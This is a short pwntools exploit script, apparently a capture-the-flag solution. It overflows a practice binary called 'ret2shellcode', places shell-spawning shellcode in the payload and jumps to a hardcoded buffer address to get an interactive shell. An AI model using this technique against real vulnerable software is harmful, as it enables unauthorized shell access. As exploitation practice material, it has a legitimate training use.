```python3
#!bin/python                                                                 
from pwn import *
io = process("./ret2shellcode")
payload = asm(shellcraft.sh()).ljust(0x6c + 4, b'A') + p32(0x0804A080)
io.send(payload)
io.interactive()
```

